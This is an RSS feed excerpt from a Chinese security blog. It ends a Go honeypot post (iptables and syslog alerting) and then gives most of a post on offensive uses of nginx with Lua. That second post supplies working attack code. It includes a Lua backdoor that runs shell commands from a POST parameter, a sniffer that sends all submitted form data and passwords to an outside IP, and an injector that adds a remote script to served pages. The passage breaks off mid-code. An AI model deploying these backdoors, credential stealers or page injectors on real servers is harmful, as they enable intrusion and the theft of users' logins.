&amp;quot;-t&amp;quot;, &amp;quot;nat&amp;quot;, &amp;quot;-A&amp;quot;, &amp;quot;HONEYPOT&amp;quot;, &amp;quot;-i&amp;quot;, interfaceName, &amp;quot;-p&amp;quot;, &amp;quot;tcp&amp;quot;, &amp;quot;-m&amp;quot;, &amp;quot;multiport&amp;quot;, &amp;quot;!&amp;quot;, &amp;quot;--dports&amp;quot;, strings.Join(policy.Whiteport, &amp;quot;,&amp;quot;), &amp;quot;-j&amp;quot;, &amp;quot;DNAT&amp;quot;, &amp;quot;--to-destination&amp;quot;, policy.Backend).Output()&#xA;    fmt.Println(ret, err)&#xA;    exec.Command(&amp;quot;/sbin/iptables&amp;quot;, &amp;quot;-t&amp;quot;, &amp;quot;nat&amp;quot;, &amp;quot;-A&amp;quot;, &amp;quot;POSTROUTING&amp;quot;, &amp;quot;-o&amp;quot;, interfaceName, &amp;quot;-j&amp;quot;, &amp;quot;MASQUERADE&amp;quot;).Output()&#xA;}&#xA;&#xA;// set ipv4.ip_forward&#xA;func SetIp_forward() {&#xA;    cmd := exec.Command(&amp;quot;/sbin/sysctl&amp;quot;, &amp;quot;-w&amp;quot;, &amp;quot;net.ipv4.ip_forward=1&amp;quot;)&#xA;    cmd.Run()&#xA;    cmd = exec.Command(&amp;quot;/sbin/sysctl&amp;quot;, &amp;quot;-p&amp;quot;)&#xA;    cmd.Run()&#xA;}&#xA;&#xA;// Init iptables policy&#xA;func InitPolicy() {&#xA;    // set honeypot chain in nat table&#xA;    exec.Command(&amp;quot;/sbin/iptables&amp;quot;, &amp;quot;-t&amp;quot;, &amp;quot;nat&amp;quot;, &amp;quot;-N&amp;quot;, &amp;quot;HONEYPOT&amp;quot;).Run()&#xA;    exec.Command(&amp;quot;/sbin/iptables&amp;quot;, &amp;quot;-t&amp;quot;, &amp;quot;nat&amp;quot;, &amp;quot;-F&amp;quot;, &amp;quot;HONEYPOT&amp;quot;).Run()&#xA;    exec.Command(&amp;quot;/sbin/iptables&amp;quot;, &amp;quot;-t&amp;quot;, &amp;quot;nat&amp;quot;, &amp;quot;-A&amp;quot;, &amp;quot;PREROUTING&amp;quot;, &amp;quot;-j&amp;quot;, &amp;quot;HONEYPOT&amp;quot;).Run()&#xA;    exec.Command(&amp;quot;/sbin/iptables&amp;quot;, &amp;quot;-t&amp;quot;, &amp;quot;nat&amp;quot;, &amp;quot;-A&amp;quot;, &amp;quot;HONEYPOT&amp;quot;, &amp;quot;-i&amp;quot;, interfaceName, &amp;quot;-p&amp;quot;, &amp;quot;tcp&amp;quot;, &amp;quot;-m&amp;quot;, &amp;quot;state&amp;quot;, &amp;quot;--state&amp;quot;, &amp;quot;NEW,ESTABLISHED,RELATED&amp;quot;, &amp;quot;-j&amp;quot;, &amp;quot;LOG&amp;quot;, &amp;quot;--log-prefix&amp;quot;, &amp;quot;iptables &amp;quot;).Run()&#xA;    // set white list chain in filter table&#xA;    exec.Command(&amp;quot;/sbin/iptables&amp;quot;, &amp;quot;-t&amp;quot;, &amp;quot;filter&amp;quot;, &amp;quot;-N&amp;quot;, &amp;quot;WHITELIST&amp;quot;).Run()&#xA;    exec.Command(&amp;quot;/sbin/iptables&amp;quot;, &amp;quot;-t&amp;quot;, &amp;quot;filter&amp;quot;, &amp;quot;-F&amp;quot;, &amp;quot;WHITELIST&amp;quot;).Run()&#xA;    exec.Command(&amp;quot;/sbin/iptables&amp;quot;, &amp;quot;-t&amp;quot;, &amp;quot;filter&amp;quot;, &amp;quot;-A&amp;quot;, &amp;quot;INPUT&amp;quot;, &amp;quot;-j&amp;quot;, &amp;quot;WHITELIST&amp;quot;).Run()&#xA;}&#xA;&#xA;// Delete Policy&#xA;func DeletePolicy() {&#xA;    // Flush rule&#xA;    exec.Command(&amp;quot;/sbin/iptables&amp;quot;, &amp;quot;-t&amp;quot;, &amp;quot;nat&amp;quot;, &amp;quot;-F&amp;quot;).Run()&#xA;    exec.Command(&amp;quot;/sbin/iptables&amp;quot;, &amp;quot;-t&amp;quot;, &amp;quot;filter&amp;quot;, &amp;quot;-F&amp;quot;).Run()&#xA;    // delete chain&#xA;    exec.Command(&amp;quot;/sbin/iptables&amp;quot;, &amp;quot;-t&amp;quot;, &amp;quot;nat&amp;quot;, &amp;quot;-X&amp;quot;, &amp;quot;HONEYPOT&amp;quot;).Run()&#xA;    exec.Command(&amp;quot;/sbin/iptables&amp;quot;, &amp;quot;-t&amp;quot;, &amp;quot;filter&amp;quot;, &amp;quot;-X&amp;quot;, &amp;quot;WHITELIST&amp;quot;).Run()&#xA;}&#xA;&#xA;// Start Agent&#xA;func Start(p Policys) {&#xA;    Stop()&#xA;    // set ip forward&#xA;    SetIp_forward()&#xA;    // create iptables chain&#xA;    InitPolicy()&#xA;    // set iptables rule&#xA;    SetIptables(p)&#xA;}&#xA;&#xA;// Stop Agent&#xA;func Stop() {&#xA;    // clean iptables rule and chain&#xA;    DeletePolicy()&#xA;}&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;h2 id=&#34;server的实现&#34;&gt;Server的实现&lt;/h2&gt;&#xA;&#xA;&lt;p&gt;蜜罐server使用&lt;code&gt;gopkg.in/mcuadros/go-syslog.v2&lt;/code&gt;包实现了一个rsyslog server，将每条收到的rsyslog进行格式化，然后判断是否在白名单中，如果不在白名单中，然后对攻击数据进行计数（超过一定的时间后再开始从0开始计数），&#xA;如果在规定的时间内超过配置的报警的次数后就不会再报了，防止短时间内产生大量的垃圾邮件。&lt;/p&gt;&#xA;&#xA;&lt;p&gt;比如可以把策略设为：同一个来源的攻击者，3分钟内只发1封报警邮件，报警策略的代码如下：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// check if send alarm mail&#xA;func AlarmPolicy(redisConfig RedisConfig, sysLog map[string]interface{}) (isAlarm bool) {&#xA;    client := redis.NewClient(&amp;amp;redis.Options{&#xA;        Addr:     fmt.Sprintf(&amp;quot;%s:%d&amp;quot;, redisConfig.Host, redisConfig.Port),&#xA;        Password: redisConfig.Password, //  password set&#xA;        DB:       redisConfig.Db,       // use default DB&#xA;    })&#xA;&#xA;    src, ok := sysLog[&amp;quot;src&amp;quot;].(string)&#xA;    if ok {&#xA;        bRet, _ := client.Exists(src).Result()&#xA;        if bRet {&#xA;            client.HIncrBy(src, &amp;quot;times&amp;quot;, 1)&#xA;            // client.Expire(src, time.Duration(redisConfig.Duration)*time.Minute)&#xA;&#xA;        } else {&#xA;            client.HSet(src, &amp;quot;times&amp;quot;, &amp;quot;1&amp;quot;)&#xA;            client.Expire(src, time.Duration(redisConfig.Duration)*time.Minute)&#xA;        }&#xA;&#xA;        strRet, _ := client.HGet(src, &amp;quot;times&amp;quot;).Result()&#xA;        ret, _ := strconv.Atoi(strRet)&#xA;        fmt.Printf(&amp;quot;strRet:%v, ret:%v, AlarmOffTime:%v\n&amp;quot;, strRet, ret, redisConfig.AlarmOffTime)&#xA;        if ret &amp;lt;= redisConfig.AlarmOffTime {&#xA;            isAlarm = true&#xA;        }&#xA;    }&#xA;    return isAlarm&#xA;}&#xA;&#xA;// send alarm mail&#xA;func Alarm(redisConfig RedisConfig, sysLog map[string]interface{}, subject string, body string, mail_config MailConfig, alarmInfo AlarmInfo) {&#xA;    if AlarmPolicy(redisConfig, sysLog) {&#xA;        go SendMail(subject, body, mail_config)&#xA;        go InsertElastic(*alarmInfo.Client, alarmInfo.EsIndex, alarmInfo.EsDocument, alarmInfo.Id, alarmInfo.LogParts)&#xA;    }&#xA;}&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;以下为server处理rsyslog的核心代码：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func main() {&#xA;    Loadconfig()&#xA;&#xA;    channel := make(syslog.LogPartsChannel)&#xA;    handler := syslog.NewChannelHandler(channel)&#xA;&#xA;    server := syslog.NewServer()&#xA;    server.SetFormat(syslog.Automatic)&#xA;    server.SetHandler(handler)&#xA;    server.ListenUDP(&amp;quot;0.0.0.0:514&amp;quot;)&#xA;    server.ListenTCP(&amp;quot;0.0.0.0:514&amp;quot;)&#xA;&#xA;    server.Boot()&#xA;&#xA;    go func(channel syslog.LogPartsChannel) {&#xA;        client, err := helper.ConnectElastic(es_info)&#xA;        log.Println(client, err, syslogConfig.Backup)&#xA;        for logParts := range channel {&#xA;            // fmt.Printf(&amp;quot;%V,%v\n&amp;quot;, logParts, logParts)&#xA;            value, ok := logParts[&amp;quot;content&amp;quot;].(string)&#xA;            if ok {&#xA;                // backup syslog to localhost&#xA;                if syslogConfig.Backup == 1 {&#xA;                    go helper.BackupSyslog(syslogConfig.Tag, value)&#xA;                }&#xA;                ret := helper.ParseLogContent(value)&#xA;                // logParts[&amp;quot;content&amp;quot;] = ret&#xA;                // fmt.Println(ret)&#xA;                delete(logParts, &amp;quot;content&amp;quot;)&#xA;                for k, v := range ret {&#xA;                    logParts[k] = v&#xA;                }&#xA;                // fmt.Println(&amp;quot;logParts: &amp;quot;, logParts)&#xA;                p, _ := helper.GetPolicy(Url)&#xA;                white_list := helper.GetWhiteList(p)&#xA;                white_ports := helper.GetWhitePort(p)&#xA;                src := ret[&amp;quot;src&amp;quot;]&#xA;                id := ret[&amp;quot;id&amp;quot;]&#xA;                dpt := ret[&amp;quot;dpt&amp;quot;]&#xA;&#xA;                // for mail content template&#xA;                var mailContent helper.MailContent&#xA;                Timestamp, _ := logParts[&amp;quot;timestamp&amp;quot;].(time.Time)&#xA;                mailContent.Timestamp = Timestamp.Format(&amp;quot;2006-01-02 15:04:05&amp;quot;)&#xA;                mailContent.SrcIp, _ = logParts[&amp;quot;src&amp;quot;].(string)&#xA;                mailContent.SrcHostname, _ = helper.GetHostNameByIp(mailContent.SrcIp)&#xA;                mailContent.SrcPort, _ = logParts[&amp;quot;spt&amp;quot;].(string)&#xA;                mailContent.Proto, _ = logParts[&amp;quot;proto&amp;quot;].(string)&#xA;                mailContent.DestIp, _ = logParts[&amp;quot;dst&amp;quot;].(string)&#xA;                mailContent.DestPort, _ = logParts[&amp;quot;dpt&amp;quot;].(string)&#xA;                mailContent.Hostname, _ = logParts[&amp;quot;hostname&amp;quot;].(string)&#xA;                mailContent.Color = helper.GetColor()&#xA;&#xA;                log.Println(white_list, src, white_ports, dpt, mailContent)&#xA;                if !white_list[src] &amp;amp;&amp;amp; !white_ports[dpt] {&#xA;                    subject := fmt.Sprintf(&amp;quot;[蜜罐报警]%v, 截获来自%v:%v对%v:%v的攻击(%v)&amp;quot;, mailContent.Timestamp, src, ret[&amp;quot;spt&amp;quot;], ret[&amp;quot;dst&amp;quot;], ret[&amp;quot;dpt&amp;quot;], ret[&amp;quot;proto&amp;quot;])&#xA;                    // body, _ := json.MarshalIndent(logParts, &amp;quot;&amp;quot;, &amp;quot;\t&amp;quot;)&#xA;                    t, _ := template.New(&amp;quot;mail&amp;quot;).Parse(helper.HtmlMail)&#xA;                    var body bytes.Buffer&#xA;                    t.Execute(&amp;amp;body, mailContent)&#xA;&#xA;                    // Alarm info, save to es too&#xA;                    var alarmInfo helper.AlarmInfo&#xA;                    alarmInfo.Client = client&#xA;                    alarmInfo.EsIndex = es_info.Index&#xA;                    alarmInfo.EsDocument = es_info.DocumentAlarm&#xA;                    alarmInfo.Id = id&#xA;                    alarmInfo.LogParts = logParts&#xA;&#xA;                    go helper.Alarm(redisConfig, logParts, subject, fmt.Sprintf(&amp;quot;%s&amp;quot;, body.String()), mail_config, alarmInfo)&#xA;                    &#xA;                    go helper.InsertElastic(*client, es_info.Index, es_info.Document, id, logParts)&#xA;                }&#xA;            }&#xA;            // log.Println(strings.Repeat(&amp;quot;-&amp;quot;, 70))&#xA;        }&#xA;    }(channel)&#xA;&#xA;    server.Wait()&#xA;}&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;蜜罐的测试效果：&#xA;&lt;img src=&#34;/media/images_honeypot/honeypot.png&#34; alt=&#34;honeypot&#34; /&gt;&lt;/p&gt;&#xA;&#xA;&lt;h2 id=&#34;扩展功能&#34;&gt;扩展功能&lt;/h2&gt;&#xA;&#xA;&lt;p&gt;以上的Agent放在重要系统的内网网段为一个支持所有协议和端口的蜜罐，其实也可以改为一个适用于小网站的防火墙放在外网。&#xA;做成防火墙需要做的改动如下：&lt;/p&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;去掉数据转发到后端的功能&lt;/li&gt;&#xA;&lt;li&gt;设计防火墙策略（以下仅为举例，正式使用的话，需要根据对不同的端口的攻击设置不同的频率）例如：&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;如果1分钟内同一个IP的请求超过100，可以将攻击者的所有请求转到一个欺骗的地址（镜花水月）&lt;/li&gt;&#xA;&lt;li&gt;如果1分钟内同一个IP的请求超过300，可以将攻击者的所有请求原封不动的反弹回去（斗转星移）&lt;/li&gt;&#xA;&lt;li&gt;如果1分钟内同一个IP的请求超过600，直接将攻击者的IP Block掉，禁止访问。&lt;/li&gt;&#xA;&lt;/ol&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;h2 id=&#34;参考资料&#34;&gt;参考资料&lt;/h2&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://n0where.net/how-does-it-work-iptables/&#34;&gt;How Does It Work: IPTables&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;http://txgcwm.github.io/blog/2013/07/25/linuxxia-iptablesfang-huo-qiang-yuan-li-ji-shi-yong/&#34;&gt;Linux下iptables防火墙原理及使用&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://segmentfault.com/a/1190000002540601&#34;&gt;iptables防火墙原理详解&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;</description>
      <pubDate>Fri, 08 Jul 2016 16:04:12 +0000</pubDate>
    </item>
    <item>
      <title>nginx-lua-security</title>
      <link>http://www.xsec.io/2016/7/8/nginx-lua-security.html</link>
      <description>&lt;p&gt;时隔半年后，我终于又写了篇blog，知乎专栏的地址为：&#xA;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/21362834&#34;&gt;浅谈nginx + lua在安全中的一些应用&lt;/a&gt;&lt;/p&gt;&#xA;&#xA;&lt;h2 id=&#34;浅谈nginx-lua在安全中的一些应用&#34;&gt;浅谈nginx + lua在安全中的一些应用&lt;/h2&gt;&#xA;&#xA;&lt;h3 id=&#34;概要&#34;&gt;概要&lt;/h3&gt;&#xA;&#xA;&lt;p&gt;nginx是一个用C语言开发的高性能WEB服务器及反向代理服务器，直接使用c/c++进行二次开发，对于很多用户是有一定门槛的，且c/c++的开发效率也比不上python、js、lua等语言，python、js、lua 三者中，lua 是解析器最小，性能最高的语言，luajit比lua 又快数10倍。目前将nginx和lua 结合在一起的有春哥维护的&lt;a href=&#34;http://openresty.org/cn/&#34;&gt;openresty&lt;/a&gt;和淘宝维护的&lt;a href=&#34;http://tengine.taobao.org/&#34;&gt;Tengine&lt;/a&gt;。&lt;/p&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;p&gt;最先将Nginx，Lua组合到一起的是OpenResty，春哥提供了一个&lt;a href=&#34;https://github.com/openresty/lua-nginx-module&#34;&gt;lua-nginx-module模块&lt;/a&gt;，可以将Lua嵌入到了Nginx里面， 锤子T2发布会上捐赠的项目就是春哥的openresty；&lt;/p&gt;&lt;/li&gt;&#xA;&#xA;&lt;li&gt;&lt;p&gt;随后Tengine fork了nginx的一个分支，也包含了&lt;a href=&#34;https://github.com/openresty/lua-nginx-module&#34;&gt;lua-nginx-module模块&lt;/a&gt;。&lt;/p&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;h4 id=&#34;openresty与tengine的区别&#34;&gt;openresty与tengine的区别：&lt;/h4&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;p&gt;OpenResty是Nginx的Bundle，与官方的最新版本是同步的&lt;/p&gt;&lt;/li&gt;&#xA;&#xA;&lt;li&gt;&lt;p&gt;Tengine则是Nginx 1.6.2版本的Fork, 阿里根据自己的业务情况对nginx进行了一些定制开发&lt;/p&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;h4 id=&#34;nginx-lua-的应用场景&#34;&gt;nginx + lua 的应用场景&lt;/h4&gt;&#xA;&#xA;&lt;p&gt;OpenResty通过汇聚各种设计精良的 Nginx 模块（主要由 OpenResty 团队自主开发），从而将 Nginx 有效地变成一个强大的通用 Web 应用平台，在WEB应用与信息安全领域均有广泛的应用：&lt;/p&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;p&gt;业务部门可以用其快速构造出足以胜任 10K 乃至 1000K 以上单机并发连接的高性能 Web 应用系统，具体的应用场景可以参考&lt;a href=&#34;http://www.iresty.com/&#34;&gt;OpenResty Con 2015&lt;/a&gt;，目前基于openresty的web框架有以下几种：&lt;/p&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://github.com/leafo/lapis&#34;&gt;https://github.com/leafo/lapis&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://github.com/idevz/vanilla&#34;&gt;https://github.com/idevz/vanilla&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://github.com/sumory/lor&#34;&gt;https://github.com/sumory/lor&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://github.com/dualface/gbc-core（游戏后端框架）&#34;&gt;https://github.com/dualface/gbc-core（游戏后端框架）&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&lt;/li&gt;&#xA;&#xA;&lt;li&gt;&lt;p&gt;安全从业人员经常用来写waf、安全代理（身份认证、敏感信息删除等）&lt;/p&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;p&gt;本文先写一些偏渗透方面的，主要包括以下几个方面：&lt;/p&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;后门&lt;/li&gt;&#xA;&lt;li&gt;数据监听、窃取&lt;/li&gt;&#xA;&lt;li&gt;挂马&lt;/li&gt;&#xA;&lt;li&gt;lua代码加密及隐蔽&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;h3 id=&#34;安装&#34;&gt;安装&lt;/h3&gt;&#xA;&#xA;&lt;h4 id=&#34;openresty和tengine&#34;&gt;openresty和tengine&lt;/h4&gt;&#xA;&#xA;&lt;p&gt;openresty和tengine默认已经集成了lua的功能，安装过程比较方便。&lt;/p&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;openresty的安装&#xA;&lt;code&gt;&#xA;tar xzvf ngx_openresty-VERSION.tar.gz&#xA;cd ngx_openresty-VERSION/&#xA;./configure&#xA;gmake&#xA;gmake install&#xA;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;tengine的安装&#xA;&lt;code&gt;&#xA;wget http://tengine.taobao.org/download/tengine-2.1.2.tar.gz&#xA;tar -zxvf tengine-2.1.2.tar.gz&#xA;cd tengine-2.1.2&#xA;./configure&#xA;make&#xA;make install&#xA;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;h4 id=&#34;为nginx安装lua-nginx-module&#34;&gt;为nginx安装lua-nginx-module&lt;/h4&gt;&#xA;&#xA;&lt;p&gt;为nginx安装lua-nginx-module分为以下几个步骤：&lt;/p&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;安装LuaJIT 2.0或2.1或 lua 5.1（5.2以上版本不支持）&lt;/li&gt;&#xA;&lt;li&gt;下载ngx_devel_kit、 ngx_lua&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;p&gt;编译安装过程如下：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;wget &#39;http://nginx.org/download/nginx-1.9.15.tar.gz&#39;&#xA; tar -xzvf nginx-1.9.15.tar.gz&#xA; cd nginx-1.9.15/&#xA; export LUAJIT_LIB=/path/to/luajit/lib&#xA; export LUAJIT_INC=/path/to/luajit/include/luajit-2.1&#xA; ./configure --prefix=/opt/nginx \&#xA;         --with-ld-opt=&amp;quot;-Wl,-rpath,/path/to/luajit-or-lua/lib&amp;quot; \&#xA;         --add-module=/path/to/ngx_devel_kit \&#xA;         --add-module=/path/to/lua-nginx-module&#xA; make -j2&#xA; make install&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;nginx 1.9.11及以后的版本支持动态加载模块，将ngx_devel_kit、 ngx_lua编译为.so文 件，通过load_module指令就可以加载到nginx中了，&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;load_module /path/to/modules/ndk_http_module.so;  # assuming NDK is built as a dynamic module too&#xA;load_module /path/to/modules/ngx_http_lua_module.so;&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;将nginx模块编译为动态模块的方法可以参考：&lt;a href=&#34;https://www.nginx.com/resources/wiki/extending/converting/&#34;&gt;https://www.nginx.com/resources/wiki/extending/converting/&lt;/a&gt;&#xA;在实际的应用中，如果目标网站中是原生的nginx，我们也可以考虑用nginx -V命令获取到目标网站的编译参数，然后在本地虚拟机中编译一个相同版本、带有lua模块的nginx二进制文件替换到目标站点的。&lt;/p&gt;&#xA;&#xA;&lt;h3 id=&#34;后门&#34;&gt;后门&lt;/h3&gt;&#xA;&#xA;&lt;p&gt;在nginx.conf文件中的http节中加入如下内容：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;http {&#xA;  include       mime.types;&#xA;  # lua 文件的位置&#xA;  lua_package_path &amp;quot;/usr/local/openresty/nginx/conf/lua_src/?.lua;;&amp;quot;;&#xA;  # nginx启动阶段时执行的脚本，可以不加&#xA;  init_by_lua_file &#39;conf/lua_src/Init.lua&#39;;&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;conf/lua_src/Init.lua中的内容如下：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;local p = &amp;quot;/usr/local/openresty/nginx/conf/lua_src&amp;quot;&#xA;local m_package_path = package.path&#xA;package.path = string.format(&amp;quot;%s?.lua;%s?/init.lua;%s&amp;quot;, p, p, m_package_path)&#xA;cmd = require(&amp;quot;t&amp;quot;)&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;cmd = require(&amp;ldquo;t&amp;rdquo;)表示加载了t.lua中的模块，并命名为cmd，以后在nginx的所有执行阶段通过cmd变量就可以调用了。&#xA;t.lua实现了一个简单的命令执行功能，如下所示：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;local _M = {}&#xA;function _M.run()&#xA;    ngx.req.read_body()&#xA;    local post_args = ngx.req.get_post_args()&#xA;    -- for k, v in pairs(post_args) do&#xA;    --    ngx.say(string.format(&amp;quot;%s = %s&amp;quot;, k, v))&#xA;    -- end&#xA;    local cmd = post_args[&amp;quot;cmd&amp;quot;]&#xA;    if cmd then&#xA;        f_ret = io.popen(cmd)&#xA;        local ret = f_ret:read(&amp;quot;*a&amp;quot;)&#xA;        ngx.say(string.format(&amp;quot;reply:\n%s&amp;quot;, ret))&#xA;    end&#xA;end&#xA;return _M&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;nginx有11个处理阶段，如下图所示：&#xA;&lt;img src=&#34;/media/images/000.png&#34; alt=&#34;&#34; /&gt;&#xA;一般我们在开发过程中常用到的阶段如下：&lt;/p&gt;&#xA;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;set_by_lua*: 流程分之处理判断变量初始化&lt;/li&gt;&#xA;&lt;li&gt;rewrite_by_lua*: 转发、重定向、缓存等功能(例如特定请求代理到外网)&lt;/li&gt;&#xA;&lt;li&gt;access_by_lua*: IP准入、接口权限等情况集中处理(例如配合iptable完成简单防火墙)&lt;/li&gt;&#xA;&lt;li&gt;content_by_lua*: 内容生成&lt;/li&gt;&#xA;&lt;li&gt;header_filter_by_lua*: 应答HTTP过滤处理(例如添加头部信息)&lt;/li&gt;&#xA;&lt;li&gt;body_filter_by_lua*: 应答BODY过滤处理(例如完成应答内容统一成大写)&lt;/li&gt;&#xA;&lt;li&gt;log_by_lua*: 回话完成后本地异步完成日志记录(日志可以记录在本地，还可以同步到其他机器)&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;p&gt;一般情况下，我们使用content阶段即可，以下的例子为把content_by_lua放到server段的/test/ location下&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;1     location /test/ {&#xA;2       content_by_lua &#39;&#xA;3       cmd.run()&#xA;4       &#39;;&#xA;5     }&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;执行效果如图所示：&#xA;&lt;img src=&#34;/media/images/001.png&#34; alt=&#34;&#34; /&gt;&#xA;如果将content_by_lua改为access_by_lua（content阶段不允许放在http节）放到http段表示为一个全局的后门，随便一个url，只要传入我们特定的参数，nginx就会响应，即便是404的页面也可以，如下图的所示：&#xA;&lt;img src=&#34;/media/images/002.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;&#xA;&#xA;&lt;h3 id=&#34;数据监听-窃取&#34;&gt;数据监听、窃取&lt;/h3&gt;&#xA;&#xA;&lt;p&gt;nginx实现数据监听非法方便，只要以下ngx.req.read_body()和local post_args = ngx.req.get_post_args()2行代码即可，&#xA;再利用lua-resty-http模块就可以将数据通过post的方式提交到黑阔指定的地方，测试代码如下：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;local http = require &amp;quot;resty.http&amp;quot;&#xA;local cjson = require(&amp;quot;cjson&amp;quot;)&#xA;&#xA;local _M = {}&#xA;&#xA;function _M.sniff()&#xA;    ngx.req.read_body()&#xA;    local post_args = ngx.req.get_post_args()&#xA;    ngx.log(ngx.DEBUG, &amp;quot;data=&amp;quot; .. cjson.encode(post_args))&#xA;    if post_args then&#xA;        local httpc = http.new()&#xA;        local res, err = httpc:request_uri(&amp;quot;http://111.111.111.111/test/&amp;quot;, {&#xA;            method = &amp;quot;POST&amp;quot;,&#xA;            body = &amp;quot;data=&amp;quot; .. cjson.encode(post_args),&#xA;            headers = {&#xA;            [&amp;quot;Content-Type&amp;quot;] = &amp;quot;application/x-www-form-urlencoded&amp;quot;,&#xA;        }&#xA;        })&#xA;    end&#xA;end&#xA;&#xA;return _M&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;然后用tornado写个接受post参数的web程序，测试代码及效果如下：&#xA;&lt;img src=&#34;/media/images/003.png&#34; alt=&#34;&#34; /&gt;&#xA;如果将监听的代码放到nginx的http段中，表示全局监听并窃取post数据，这样黑阔就会收到所有的post数据请求，对目标服务器的性能也有影响。&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;access_by_lua &#39;cmd.sniff() &#39;;&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;p&gt;最佳的做法是放到目标站点的关键的location中，比如/login、/admin等，需要注意的是lua-resty-http是基于cosocket实现的，所以不能放在以下几个阶段&#xA;set_by_lua&lt;em&gt;, log_by_lua&lt;/em&gt;, header_filter_by_lua*, body_filter_by_lua。&lt;/p&gt;&#xA;&#xA;&lt;p&gt;如果只想记录正确的密码，过滤掉错误的，就需要在header_filter_by_lua或body_filter_by_lua阶段，通过服务器返回的值来判断用户post提交的密码是否正确，这个时候如果想提交到服务器中的话，就不能使用lua-resty-http了，但是可以通过ngx.timer.at 以异步的方式提交。&#xA;另外也可以使用第三方的模块lua-requests在header_filter_by_lua或body_filter_by_lua阶段提交数据，利用luarocks为openresty安装lua-requests的过程如下：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;wget http://luarocks.org/releases/luarocks-2.0.13.tar.gz&#xA;tar -xzvf luarocks-2.0.13.tar.gz&#xA;cd luarocks-2.0.13/&#xA;./configure --prefix=/usr/local/openresty/luajit \&#xA;    --with-lua=/usr/local/openresty/luajit/ \&#xA;    --lua-suffix=jit-2.1.0-alpha \&#xA;    --with-lua-include=/usr/local/openresty/luajit/include/luajit-2.1&#xA;make&#xA;sudo make install&#xA;&#xA;sudo /usr/local/openresty/luajit/luarocks install lua-requests&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&#xA;&lt;h3 id=&#34;挂马&#34;&gt;挂马&lt;/h3&gt;&#xA;&#xA;&lt;p&gt;在nginx返回数据时，将网页木马插入即可，代码如下：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;function _M.hang_horse()&#xA;    local data = ngx.arg[1] or &amp;quot;&amp;quot;&#xA;    local html = string.gsub(data, &amp;quot;&amp;lt;/head&amp;gt;&amp;quot;, &amp;quot;&amp;lt;script src=\&amp;quot;http://docs.xsec.io/1.js\&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;&amp;quot;)&#xA;    ngx.arg[1] = 